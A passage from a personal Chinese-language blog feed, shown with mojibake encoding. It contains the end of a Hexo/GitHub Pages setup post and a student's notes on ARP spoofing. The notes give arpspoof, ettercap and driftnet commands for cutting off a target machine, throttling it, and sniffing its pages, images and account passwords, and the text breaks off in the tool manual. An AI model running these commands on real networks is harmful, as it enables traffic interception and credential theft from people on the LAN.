class="headerlink" title="GitHubé…ç½®ç½‘é¡µ"></a>GitHubé…ç½®ç½‘é¡µ</h2><p>åœ¨GitHubé‡Œå»ºä¸€ä¸ª<strong>ç”¨æˆ·å.github.io</strong>çš„ä»“åº“ï¼Œå»ºå¥½ä»¥åç‚¹å‡»pageæŠŠè¿™ä¸ªåº“å˜æˆä¸€ä¸ªç½‘é¡µã€‚</p><p>æˆ‘ä»¬åœ¨å‘½ä»¤è¡Œè¾“å…¥<code>hexo d</code> æ—¶é»˜è®¤ä¸Šä¼ <strong>master</strong>åˆ†æ”¯ï¼Œä½†æ˜¯åœ¨GitHubé¡µé¢é»˜è®¤<strong>main</strong>åˆ†æ”¯ï¼Œéœ€è¦æ”¹æˆmasterã€‚æ²¡æœ‰ä¸‹æ‹‰é€‰é¡¹ï¼Œè¦æ‰‹åŠ¨è¾“å…¥</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2023-03-13_21-16-37.png"></p><p>ä½†æ˜¯è¿™ä¸ªæ—¶å€™å…ˆåˆ«hexo dï¼Œä¼šæŠ¥é”™ï¼Œå› ä¸ºè¿˜æ²¡è¿æ¥GitHubå’Œhexoã€‚</p><p>è¿™æ—¶å€™ä½ åœ¨æµè§ˆå™¨æœç´¢<code>https://ç”¨æˆ·å.github.io</code>ï¼Œå‡ºç°ä»“åº“çš„è‡ªè¿°æ–‡ä»¶å°±æ˜¯æˆåŠŸå•¦ã€‚</p><h2 id="SSHè¿æ¥GitHub"><a href="#SSHè¿æ¥GitHub" class="headerlink" title="SSHè¿æ¥GitHub"></a>SSHè¿æ¥GitHub</h2><p>ä¹Ÿæ˜¯é»˜è®¤å¤§å®¶æœ‰è¿™ç©æ„çš„å“ˆ</p><p>åœ¨gité‡Œé¢è¾“å…¥</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">ssh<span class="hljs-literal">-keygen</span> <span class="hljs-literal">-t</span> rsa <span class="hljs-literal">-C</span> <span class="hljs-string">&quot;[your_email@example.com]&quot;</span><br></code></pre></td></tr></table></figure><p>æŒ‰å›è½¦ä¹‹åä¼šæç¤ºè¾“å…¥å†…å®¹ï¼Œå¯ä»¥å…¨éƒ¨æŒ‰å›è½¦ï¼Œè¡¨ç¤ºä½¿ç”¨é»˜è®¤çš„<code>~/.ssh</code>æ–‡ä»¶ç›®å½•å­˜æ”¾å¯†é’¥ï¼Œä»¥åŠä¸è®¾ç½®å¯†é’¥çš„å¯†ç ã€‚</p><p>åœ¨æ–‡ä»¶å¤¹é‡Œæ‰¾åˆ°.sshæ–‡ä»¶ï¼Œæ‰¾åˆ°é‡Œé¢çš„å¯†é’¥å¤åˆ¶åˆ°GitHubã€‚åœ¨ä¸ªäººè®¾ç½®é¡µé¢çš„SSH and GPG keys æ·»åŠ </p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2023-02-20_23-36-59.png"></p><p>å†æ‰“å¼€gitè¾“å…¥è¿æ¥å‘½ä»¤</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_11-42-49.png"></p><h2 id="Hexoå†…éƒ¨æ“ä½œ"><a href="#Hexoå†…éƒ¨æ“ä½œ" class="headerlink" title="Hexoå†…éƒ¨æ“ä½œ"></a>Hexoå†…éƒ¨æ“ä½œ</h2><h3 id="å†™ä½œ"><a href="#å†™ä½œ" class="headerlink" title="å†™ä½œ"></a>å†™ä½œ</h3><p><strong>åœ¨blogæ–‡ä»¶å¤¹é‡Œæ“ä½œ</strong></p><p>åˆ›å»ºæ–°æ–‡ç« </p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">hexo <span class="hljs-keyword">new</span> <span class="hljs-string">&quot;æ–‡ç« æ ‡é¢˜&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_21-05-20.png"></p><p>è¿˜ä¼šè´´å¿ƒçš„å‘Šè¯‰ä½ å»ºåœ¨å“ªé‡Œäº†</p><blockquote><p>å®ƒçœŸçš„ï¼Œæˆ‘å“­æ­»</p></blockquote><p>ä¹‹åå°±å¯ä»¥åœ¨è¿™ä¸ªæ–‡ä»¶å¤¹é‡Œçœ‹åˆ°ä»¥â€œæ–‡ç« æ ‡é¢˜â€å‘½åçš„mdæ–‡ä»¶ï¼Œåœ¨é‡Œé¢ä¿®æ”¹ä¹‹åå†è¿è¡Œ<code>hexo g</code>å’Œ<code>hexo s</code>å°±èƒ½åœ¨é¢„è§ˆç½‘é¡µçœ‹åˆ°åˆšå‘çš„æ–‡æ¡£å•¦ã€‚</p><blockquote><p>è¿™ä¸€è¶´æ— è„‘è·Ÿæ•™ç¨‹èµ°æ²¡è¸©é›·ï¼Œæˆ‘åˆæ´»äº†ğŸ¥³</p></blockquote><h5 id="é…ç½®ç¯èŠ‚"><a href="#é…ç½®ç¯èŠ‚" class="headerlink" title="é…ç½®ç¯èŠ‚"></a>é…ç½®ç¯èŠ‚</h5><p>é…ç½®æ–‡ä»¶[-config.yml]</p><p><code>title</code>ä¿®æ”¹ç½‘é¡µå¯¼èˆªæ æ ‡ç­¾</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_21-17-41.png"></p><p>è®©ç½‘é¡µå’ŒGitHubè”å§»</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-09_21-03-45.png"></p><p><code>theme</code>æ”¹ä¸»é¢˜ï¼Œç›´æ¥å¤åˆ¶ä¸»é¢˜åå­—å°±å¥½</p><h4 id="è¸©å‘-2"><a href="#è¸©å‘-2" class="headerlink" title="è¸©å‘"></a>è¸©å‘</h4><p><code>hexo d</code>æŠŠå†™ä½œéƒ¨ç½²åˆ°GitHubä¸Šï¼ŒåˆæŠ¥é”™å•¦å“ˆå“ˆå“ˆ</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_21-30-22.png"></p><p>ä¸‡èƒ½çš„äº’è”ç½‘è¯´è¿™ä¸ªå«æ˜ å°„æ¡ç›®ç¼©è¿›é”™è¯¯ï¼Œæ”¹äº†å¥½å‡ éç¼©è¿›éƒ½ä¸å¯¹</p><p>è¿˜ç¢°åˆ°äº†ä¸€ä¸ªé”™è¯¯</p><blockquote><p>(101.1)é”™è¯¯çš„æ„æ€æ˜¯ç¬¬101è¡Œä¸å‰æ–‡é‡å¤ï¼ŒæŠŠè¿™ä¸€è¡Œæ³¨é‡Šæ‰å°±è¡Œ</p></blockquote><p>æœ€åæ”¹æˆè¿™æ ·è¿è¡ŒæˆåŠŸ</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_21-49-15.png"></p><p>ä½†æ˜¯æŸ¥çœ‹<a href="https://shmodifier.github.ioè¿˜æ˜¯ä¸æˆåŠŸ/">https://ShModifier.github.ioè¿˜æ˜¯ä¸æˆåŠŸ</a></p><p>åæ¥å‘ç°æˆ‘è¿™èªæ˜çš„å°è„‘ç“œæŠŠä¿¡æ¯æ”¾é”™äº†ä½ç½®ğŸƒ</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-09_21-03-45.png"></p><p>æ”¹æˆè¿™æ ·å°±å¥½å•¦</p><hr><p>æŠŠæ­åšå®¢çš„ç¬”è®°å‘ä¸Šæ¥ï¼Œç»™å¤§å®¶çœ‹çœ‹ç¬‘è¯â˜ƒï¸</p>]]></content>
    
    
    <categories>
      
      <category>è¸©å‘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>hexo</tag>
      
      <tag>GitHub</tag>
      
      <tag>Node</tag>
      
      <tag>Git</tag>
      
      <tag>ssh</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å…³äºARPæ¬ºéª—å’ŒARPæ”»å‡»</title>
    <link href="/2023/01/05/%E5%85%B3%E4%BA%8EARP%E6%AC%BA%E9%AA%97%E5%92%8CARP%E6%94%BB%E5%87%BB/"/>
    <url>/2023/01/05/%E5%85%B3%E4%BA%8EARP%E6%AC%BA%E9%AA%97%E5%92%8CARP%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<p>è¶ç€å¯’å‡å·å·å·å“ˆå“ˆå“ˆğŸ¤ª</p><span id="more"></span><h3 id="ARPåè®®"><a href="#ARPåè®®" class="headerlink" title="ARPåè®®"></a>ARPåè®®</h3><p>åœ°å€è§£æåè®®ï¼Œå³ARPï¼ˆAddress Resolution Protocolï¼‰ï¼Œæ˜¯æ ¹æ®IPåœ°å€è·å–ç‰©ç†åœ°å€çš„ä¸€ä¸ªTCP&#x2F;IPåè®®ã€‚</p><blockquote><p>æ¯ä¸€å°ä¸»æœºéƒ½æœ‰ä¸€ä¸ªarpé«˜é€Ÿç¼“å­˜ï¼Œé‡Œé¢æœ‰æœ¬å±€åŸŸç½‘ä¸­çš„å„ä¸»æœºå’Œè·¯ç”±å™¨çš„IPåœ°å€åˆ°ç¡¬ä»¶åœ°å€çš„æ˜ å°„è¡¨</p></blockquote><h4 id="å·¥ä½œæµç¨‹"><a href="#å·¥ä½œæµç¨‹" class="headerlink" title="å·¥ä½œæµç¨‹"></a>å·¥ä½œæµç¨‹</h4><p>ä¸»æœºAå’Œä¸»æœºBå„è‡ªæœ‰è‡ªå·±çš„IPåœ°å€å’ŒMACåœ°å€ï¼Œåœ¨ä¸»æœºAä¸ä¸»æœºBé€šä¿¡æ—¶ï¼ŒARPåè®®å¯å°†ä¸»æœºBçš„IPåœ°å€è§£æä¸ºMACåœ°å€ã€‚</p><p>ç¬¬ä¸€æ­¥ï¼š</p><p>ä¸»æœºAé¦–å…ˆç¡®å®šç”¨äºè®¿é—®ä¸»æœºBçš„IPåœ°å€ï¼Œç„¶åä¸»æœºAåœ¨è‡ªå·±çš„æœ¬åœ°ARPç¼“å­˜ä¸­æ£€æŸ¥ä¸»æœºBçš„IPåœ°å€åŒ¹é…çš„MACåœ°å€</p><p>ç¬¬äºŒæ­¥ï¼š</p><p>å¦‚æœä¸»æœºAåœ¨ARPç¼“å­˜ä¸­æ²¡æœ‰æ‰¾åˆ°ä¸»æœºBçš„IPæ˜ å°„ï¼Œå®ƒå°†è¯¢é—®ä¸»æœºBå¯¹åº”çš„ç¡¬ä»¶åœ°å€ï¼Œä¼šå°†ARPè¯·æ±‚å¸§å¹¿æ’­åˆ°æœ¬åœ°ç½‘ç»œä¸Šçš„æ‰€æœ‰ä¸»æœºï¼Œä¸»æœºAçš„IPåœ°å€å’ŒMACåœ°å€éƒ½åŒ…æ‹¬åœ¨ARPè¯·æ±‚ä¸­ã€‚æœ¬åœ°ç½‘ç»œä¸Šçš„æ¯å°ä¸»æœºéƒ½æ¥å—åˆ°ARPè¯·æ±‚å¹¶æ£€æŸ¥æ˜¯å¦ä¸è‡ªå·±çš„IPåœ°å€åŒ¹é…ã€‚å¦‚æœä¸»æœºå‘ç°è¯·æ±‚çš„IPåœ°å€ä»¥è‡ªå·±çš„IPåœ°å€ä¸åŒ¹é…ï¼Œä»–å°†ä¸¢å¼ƒARPè¯·æ±‚ã€‚</p><p><img src="/img/%E5%85%B3%E4%BA%8EARP%E6%AC%BA%E9%AA%97%E5%92%8CARP%E6%94%BB%E5%87%BB/ARP1.png"></p><p>ç¬¬ä¸‰æ­¥ï¼š</p><p>ä¸»æœºBç¡®å®šAARPè¯·æ±‚ä¸­çš„IPåœ°å€äºè‡ªå·±çš„IPåœ°å€åŒ¹é…ï¼Œå¹¶å°†ä¸»æœºAçš„IPåœ°å€å’ŒMACåœ°å€æ˜ å°„æ·»åŠ åˆ°æœ¬åœ°ARPç¼“å­˜ä¸­ã€‚</p><p>ç¬¬å››æ­¥ï¼š</p><p>ä¸»æœºBå°†åŒ…å«MACåœ°å€çš„ARPå›å¤æ¶ˆæ¯ç›´æ¥å‘é€åˆ°ä¸»æœºA</p><p><img src="/img/%E5%85%B3%E4%BA%8EARP%E6%AC%BA%E9%AA%97%E5%92%8CARP%E6%94%BB%E5%87%BB/ARP2.png"></p><p>ç¬¬äº”æ­¥ï¼š</p><p>å½“ä¸»æœºAæ”¶åˆ°ä»ä¸»æœºBå‘æ¥çš„ARPå›å¤æ¶ˆæ¯æ—¶ï¼Œä¼šä½¿ç”¨ä¸»æœºBçš„IPåœ°å€å’ŒMACåœ°å€æ˜ å°„æ›´æ–°ARPç¼“å­˜ã€‚æœ¬æœºç¼“å­˜æ˜¯æœ‰ç”Ÿå­˜æœŸçš„ï¼Œç”Ÿå­˜æœŸç»“æŸï¼Œå°†å†æ¬¡é‡å¤ä¸Šé¢çš„å†…å®¹ã€‚ä¸»æœºBçš„MACåœ°å€ä¸€æ—¦ç¡®å®šï¼Œä¸»æœºAå°±èƒ½å‘ä¸»æœºBå‘é€IPé€šä¿¡äº†ã€‚</p><h4 id="å‘½ä»¤çª—å£ç©è½¬ARP"><a href="#å‘½ä»¤çª—å£ç©è½¬ARP" class="headerlink" title="å‘½ä»¤çª—å£ç©è½¬ARP"></a>å‘½ä»¤çª—å£ç©è½¬ARP</h4><p>è¾“å…¥<code>arp</code>æç¤ºä½¿ç”¨æ–¹æ³•</p><p><img src="/img/%E5%85%B3%E4%BA%8EARP%E6%AC%BA%E9%AA%97%E5%92%8CARP%E6%94%BB%E5%87%BB/Snipaste_2023-01-04_18-08-45.png"></p><blockquote><p>è¿™é‡Œä¸€å¼€å§‹æ€»æ˜¯è¯´â€œâ€™ARPâ€™ä¸æ˜¯å¯æ‰§è¡Œçš„ç¨‹åºâ€ï¼Œå‡­æˆ‘è¸©å‘ç»éªŒçŸ¥é“è¿™æ˜¯ç¯å¢ƒå˜é‡çš„é—®é¢˜ã€‚è´¹å°½åƒè¾›ä¸‡è‹¦å‘ç°æ˜¯å› ä¸ºæˆ‘çš„ç¯å¢ƒå˜é‡é‡Œå±…ç„¶æ²¡æœ‰system32ğŸ¥²ã€‚ä½†æ˜¯è¾“å…¥pathæŸ¥çœ‹æ˜¯æœ‰å®ƒçš„ï¼Œä¸çŸ¥é“å“ªé‡Œå‡ºäº†é—®é¢˜ï¼ŒåŠ ä¸Šä¹‹åé‡å¯å°±å¥½å•¦</p></blockquote><p>è¾“å…¥<code>arp -a</code>æŸ¥çœ‹ARPç¼“å­˜è¡¨ä¿¡æ¯</p><p><img src="/img/%E5%85%B3%E4%BA%8EARP%E6%AC%BA%E9%AA%97%E5%92%8CARP%E6%94%BB%E5%87%BB/Snipaste_2023-01-04_18-09-19.jpg"></p><p><strong>é™æ€</strong>åœ°å€å³ä¸»æœºè‡ªå·±é…ç½®ç”Ÿæˆçš„åœ°å€ã€‚</p><p>å½“ä¸»æœºæ–°è¿æ¥å…¥ä¸€å°è®¾å¤‡ï¼Œå¹¶ä¸”ä¸ä¸»æœºäº§ç”Ÿé€šä¿¡åï¼Œaqpè¡¨ä¼šæ›´æ–°ä¸€æ¡<strong>åŠ¨æ€</strong>åœ°å€ã€‚</p><h3 id="ARPæ”»å‡»"><a href="#ARPæ”»å‡»" class="headerlink" title="ARPæ”»å‡»"></a>ARPæ”»å‡»</h3><p>ARPæ”»å‡»å°±æ˜¯é€šè¿‡ä¼ªé€ IPåœ°å€å’ŒMACåœ°å€çš„å¯¹åº”å…³ç³»ï¼Œä½¿å¾—ç½‘ç»œæ— æ³•æ­£å¸¸é€šä¿¡ã€‚å³ä¿®æ”¹é¶æœºçš„IPåœ°å€å’ŒMACåœ°å€ï¼Œä½¿å…¶ä»–è®¾å¤‡ä¸é¶æœºçš„é€šä¿¡æ— æ³•æ­£å¸¸è¿›è¡Œï¼Œè¿›è€Œæˆªæ–­é¶æœºæµé‡ã€‚</p><blockquote><p>å¯ä»¥ç›´æ¥ä½¿ç”¨arpspoofæ’ä»¶æ”»å‡»</p></blockquote><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">sudo arpspoof -<span class="hljs-selector-tag">i</span> eth0  -t <span class="hljs-selector-attr">[ç›®æ ‡IP]</span> -r <span class="hljs-selector-attr">[ç½‘å…³]</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œâ€râ€çš„ç”¨æ³•æ²¡ææ‡‚ğŸ˜£å¥½åƒå°±æ˜¯ç›´æ¥åŒå‘æ”»å‡»</p><p>Ctrl+Cæˆ–å…³é—­ç»ˆç«¯å³åœæ­¢æ”»å‡»</p><h3 id="ARPæ¬ºéª—"><a href="#ARPæ¬ºéª—" class="headerlink" title="ARPæ¬ºéª—"></a>ARPæ¬ºéª—</h3><p><del>å¬è¯´ARPæ¬ºéª—é…åˆDNSæ¬ºéª—æ•ˆæœæ›´ä½³</del>ğŸ¤¨</p><h5 id="å¯ä»¥ç”¨æ¥å¹²çš„åäº‹"><a href="#å¯ä»¥ç”¨æ¥å¹²çš„åäº‹" class="headerlink" title="å¯ä»¥ç”¨æ¥å¹²çš„åäº‹"></a>å¯ä»¥ç”¨æ¥å¹²çš„åäº‹</h5><ul><li>è·å–æµè§ˆå›¾ç‰‡</li><li>è·å–é¶æœºå„å¹³å°è¾“å…¥çš„è´¦å·å¯†ç </li><li>è·å–æµè§ˆåœ°å€</li></ul><h5 id="è¡Œéª—æ–¹æ³•"><a href="#è¡Œéª—æ–¹æ³•" class="headerlink" title="è¡Œéª—æ–¹æ³•"></a>è¡Œéª—æ–¹æ³•</h5><h6 id="1-ä¼ªè£…æˆç½‘å…³"><a href="#1-ä¼ªè£…æˆç½‘å…³" class="headerlink" title="1.ä¼ªè£…æˆç½‘å…³"></a>1.ä¼ªè£…æˆç½‘å…³</h6><p>æ¬ºéª—æºæŠŠè‡ªå·±ä¼ªè£…æˆç½‘å…³ï¼Œå‘å±€åŸŸç½‘å†…çš„ç›®æ ‡ä¸»æœºå‘é€ARPæŠ¥æ–‡ï¼Œä½¿å¾—å±€åŸŸç½‘å†…çš„ä¸»æœºè¯¯ä»¥ä¸ºæ¬ºéª—æºçš„MACåœ°å€æ˜¯ç½‘å…³MACåœ°å€ï¼Œå¹¶å°†åŸæœ¬åº”è¯¥æµå‘ç½‘å…³çš„æ•°æ®éƒ½å‘é€åˆ°æ¬ºéª—æºã€‚</p><blockquote><p>ç›´æ¥å¯¹é¶æœºå®æ–½ARPæ¬ºéª—</p></blockquote><h6 id="2-ä¼ªè£…æˆä¸»æœº"><a href="#2-ä¼ªè£…æˆä¸»æœº" class="headerlink" title="2.ä¼ªè£…æˆä¸»æœº"></a>2.ä¼ªè£…æˆä¸»æœº</h6><p>ç”¨æ¥æ¬ºéª—å±€åŸŸç½‘å†…çš„å…¶ä»–æ‰€æœ‰ä¸»æœº</p><p>æ¬ºéª—æºå°†è‡ªå·±ä¼ªè£…æˆå±€åŸŸç½‘å†…çš„å¦ä¸€å°ä¸»æœº3ï¼Œå°†ä¸»æœº3çš„IPåœ°å€å¯¹åº”çš„MACåœ°å€æ›¿æ¢ä¸ºæ¬ºéª—å…ƒçš„IPåœ°å€å¯¹åº”çš„MACåœ°å€ä½¿å¾—å±€åŸŸç½‘å†…é¶æœºå‘å¾€ä¸»æœº3çš„æŠ¥æ–‡éƒ½æµå‘æ¬ºéª—æº</p><blockquote><p>åˆ†åˆ«å¯¹ç½‘å…³å’Œé¶æœºå®æ–½ARPæ¬ºéª—</p></blockquote><h3 id="æ“ä½œæ­¥éª¤ï¼ˆè¡Œéª—æ­¥éª¤ï¼‰"><a href="#æ“ä½œæ­¥éª¤ï¼ˆè¡Œéª—æ­¥éª¤ï¼‰" class="headerlink" title="æ“ä½œæ­¥éª¤ï¼ˆè¡Œéª—æ­¥éª¤ï¼‰"></a>æ“ä½œæ­¥éª¤<del>ï¼ˆè¡Œéª—æ­¥éª¤ï¼‰</del></h3><blockquote><p>ä¼ªè£…æˆç½‘å…³</p></blockquote><p>é¦–å…ˆæŸ¥çœ‹æ¬ºéª—æºå’Œé¶æœºçš„IPåœ°å€</p><ul><li><p>ç›´æ¥æŸ¥çœ‹ï¼škaliå‘½ä»¤çª—å£è¾“å…¥<code>ifconfig</code>ï¼ŒWindowså‘½ä»¤çª—å£è¾“å…¥<code>ipconfig</code></p></li><li><p>æ­£ç»æ–¹æ³•ï¼š</p><p>1.åœ¨kaliå‘½ä»¤çª—å£è¾“å…¥<code>fping -g xxx.xxx.xxx[ç½‘ç»œå·ç ].1/24</code>æŸ¥è¯¢ç›®æ ‡ç½‘ç»œä¸‹çš„æ‰€æœ‰ä¸»æœºIP </p><p>2.è¾“å…¥å‘½ä»¤<code>nmap -sP xxx.xxx.xxx[ç½‘ç»œå·ç ].0/24</code>æŸ¥è¯¢ç›®æ ‡ç½‘ç»œä¸‹çš„æ‰€æœ‰ä¸»æœºIP</p></li></ul><p>è¾“å…¥å‘½ä»¤<code>route-n</code>æŸ¥çœ‹ç½‘å…³</p><p>ä½¿ç”¨arpspoofè¡Œéª—</p><blockquote><p>kaliå‘½ä»¤çª—å£è¾“å…¥sudo arpspoof -hæŸ¥çœ‹å·²ç»å®‰è£…çš„arpspoofç‰ˆæœ¬å·ï¼Œå¦‚æœæœªå®‰è£…ï¼Œç³»ç»Ÿä¼šå¼¹å‡ºæç¤ºï¼ŒæŒ‰ç…§æç¤ºå®‰è£…å³å¯ </p></blockquote><p>æ–­ç½‘æ“ä½œ</p><p>æŠŠé¶æœºå‘å‡ºçš„è¯·æ±‚æ¥å—åˆ°æ”»å‡»æºä¸»æœºï¼Œå› ä¸ºlinuxé»˜è®¤ip_forwardä¸º0ï¼Œå³ä¸è¿›è¡Œæµé‡è½¬å‘ï¼Œæ‰€ä»¥é¶æœºä¼šæ–­ç½‘</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">è®©é¶æœºè®¤ä¸ºæ”»å‡»æºä¸ºç½‘å…³ï¼š<br>sudo arpspoof -<span class="hljs-selector-tag">i</span> <span class="hljs-selector-attr">[ç½‘å¡]</span> -t <span class="hljs-selector-attr">[ç›®æ ‡IP]</span> <span class="hljs-selector-attr">[ç½‘å…³]</span><br></code></pre></td></tr></table></figure><p>æˆ–è€…åå‘æ¬ºéª—</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">è®©ç½‘å…³è®¤ä¸ºæ”»å‡»æºæ˜¯é¶æœºï¼š<br>sudo arpspoof -<span class="hljs-selector-tag">i</span> <span class="hljs-selector-attr">[ç½‘å¡]</span> -t <span class="hljs-selector-attr">[ç½‘å…³]</span> <span class="hljs-selector-attr">[ç›®æ ‡IP]</span><br></code></pre></td></tr></table></figure><blockquote><p>ç½‘å¡é»˜è®¤eth0</p></blockquote><p><img src="/img/%E5%85%B3%E4%BA%8EARP%E6%AC%BA%E9%AA%97%E5%92%8CARP%E6%94%BB%E5%87%BB/Snipaste_2023-01-05_23-10-21.jpg"></p><p><code>cat /proc/sys/net/ipv4/ip_forward </code>æŸ¥çœ‹ip_forwardçš„å€¼ã€‚å¦‚æœip_forwardä¸º0ï¼Œåˆ™è¢«æ”»å‡»ä¸»æœºä¸èƒ½ä¸Šç½‘ï¼›å¦‚æœip_forwardä¸º1ï¼Œåˆ™è¢«æ”»å‡»ä¸»æœºå¯ä»¥ä¸Šç½‘</p><p>ä¿®æ”¹æ•°å€¼è®©ä»–ä¸Šç½‘</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">echo <span class="hljs-number">1</span> &gt; <span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/net/i</span>pv4/ip_forward<br></code></pre></td></tr></table></figure><blockquote><p>æƒé™ä¸å¤Ÿå°±<code>sudo -i</code> ä½¿ç”¨rootæƒé™æ”¹</p></blockquote><p>é™åˆ¶ç½‘é€Ÿ</p><p>å¯ä»¥ä½¿ç”¨çš„å·¥å…·æœ‰tcã€iptablesã€WonderShaperç­‰ç­‰ï¼Œ</p><p>ä»¥tcä¸ºä¾‹<del>æœ¬èœé¸¡è¿˜æ²¡å­¦ä¼šåä¸¤ä¸ª</del>ğŸ˜¢ï¼š</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs maxima">é™åˆ¶ç½‘é€Ÿ200mså»¶æ—¶<br>sudo tc qdisc add dev eth0 root netem <span class="hljs-built_in">delay</span> 200ms<br> <br>å–æ¶ˆé™åˆ¶ç½‘é€Ÿ200mså»¶æ—¶<br>sudo tc qdisc <span class="hljs-built_in">del</span> dev eth0 root netem <span class="hljs-built_in">delay</span> 200ms<br></code></pre></td></tr></table></figure><p>æ‹¦æˆªæ•°æ®â€”è·å–æµè§ˆç½‘é¡µåŠè´¦å·å¯†ç </p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">ettercap -Tq -<span class="hljs-selector-tag">i</span> <span class="hljs-selector-attr">[ç½‘å¡]</span><br></code></pre></td></tr></table></figure><p>å—…æ¢å›¾ç‰‡</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">driftnet  -<span class="hljs-selector-tag">i</span> <span class="hljs-selector-attr">[ç½‘å¡]</span><br></code></pre></td></tr></table></figure><hr><h3 id="å·¥å…·è¯´æ˜ä¹¦"><a href="#å·¥å…·è¯´æ˜ä¹¦" class="headerlink" title="å·¥å…·è¯´æ˜ä¹¦"></a>å·¥å…·è¯´æ˜ä¹¦</h3><p>å› ä¸ºå„ç§å·¥å…·çš„ä½¿ç”¨è¯´æ˜éƒ½æ˜¯è‹±æ–‡çš„ï¼Œæ‰€ä»¥ç›´æ¥åˆ©ç”¨ä¸‡èƒ½çš„äº’è”ç½‘æœäº†ä¸€ä¸‹ä¸­æ–‡çš„ä½¿ç”¨æŒ‡å—ï¼š</p><h5 id="driftnet"><a href="#driftnet" class="headerlink" title="driftnet"></a>driftnet</h5> <figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs css">è¯­æ³•ï¼š driftnet   <span class="hljs-selector-attr">[options]</span>   <span class="hljs-selector-attr">[filter code]</span><br><br> -<span class="hljs-selector-tag">b</span>  æ•è·åˆ°æ–°çš„å›¾ç‰‡æ—¶å‘å‡ºå˜Ÿå˜Ÿå£°<br> -<span class="hljs-selector-tag">i</span>  interface     é€‰æ‹©ç›‘å¬æ¥å£<br> -f  file   è¯»å–ä¸€ä¸ªæŒ‡å®špcapæ•°æ®åŒ…ä¸­çš„å›¾ç‰‡<br> -<span class="hljs-selector-tag">p</span>  ä¸è®©æ‰€ç›‘å¬çš„æ¥å£ä½¿ç”¨æ··æ‚æ¨¡å¼<br> -<span class="hljs-selector-tag">a</span>  åå°æ¨¡å¼ï¼šå°†æ•è·çš„å›¾ç‰‡ä¿å­˜åˆ°ç›®å½•ä¸­ï¼ˆä¸ä¼šæ˜¾ç¤ºåœ¨å±å¹•ä¸Šï¼‰<br> -m  number æŒ‡å®šä¿å­˜å›¾ç‰‡æ•°çš„æ•°ç›®<br> -d  directory  æŒ‡å®šä¿å­˜å›¾ç‰‡çš„è·¯å¾„<br> -x  prefix  æŒ‡å®šä¿å­˜å›¾ç‰‡çš„å‰ç¼€å<br></code></pre></td></tr></table></figure><h5 id="arpspoof"><a href="#arpspoof" class="headerlink" title="arpspoof"></a>arpspoof</h5><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs markdown">åå­— <br><span class="hljs-code">       arpspoof - æˆªè·äº¤æ¢å±€åŸŸç½‘ä¸­çš„æ•°æ®åŒ…</span><br><span class="hljs-code"></span><br>ç”¨æ³•<br><span class="hljs-code">       arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host</span><br><span class="hljs-code"></span><br>æè¿°<br><span class="hljs-code">       arpspoofé€šè¿‡ä¼ªé€ çš„ARPå“åº”åŒ…æ”¹å˜å±€åŸŸç½‘ä¸­ä»ç›®æ 